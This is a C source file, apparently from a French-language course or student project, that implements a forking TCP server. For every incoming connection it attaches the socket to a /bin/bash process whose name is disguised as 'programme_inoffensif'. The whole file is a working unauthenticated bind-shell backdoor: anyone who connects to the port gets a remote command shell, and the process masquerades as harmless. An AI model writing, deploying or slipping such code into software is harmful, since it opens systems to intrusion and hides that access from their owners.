#include <stdlib.h>
#include <limits.h>
#include <sys/wait.h>
#include <errno.h>
#include <sys/socket.h>

#include "utils.h"
#include "projet_config.h"

void sigchild_handler(int sig) {
    while (waitpid(-1, NULL, WNOHANG) > 0);
}

int main(int argc, char* argv[]){
    int port = SERVER_PORT;
    if (argc == 2) {
        port = atoi(argv[1]);
    }

    // intercepter le signal SIGCHLD
    ssigaction(SIGCHLD, sigchild_handler);
    
    // Configuration du socket passif
    int server_fd = ssocket();
    sbind(port, server_fd);
    slisten(server_fd, INT_MAX);
    printf("Le serveur tourne sur le port %d\n", port);
    
    while(true){
        // Réception d'une connexion du client
        int client_fd = accept(server_fd, NULL, NULL);
        if(client_fd == -1) {
            // deal with interruption
            checkCond( errno != EINTR, "error accept");
            continue;
        }
        int childId = sfork();
        
        if(childId == 0){
            sclose(server_fd);
            
            sdup2(client_fd, 0); // stdin
            sdup2(client_fd, 1); // stdout
            sdup2(client_fd, 2); // stderr
            sclose(client_fd);

            sexecl("/bin/bash", "programme_inoffensif", NULL);
        }

        sclose(client_fd);
    }

    sclose(server_fd);
    return 0;   
}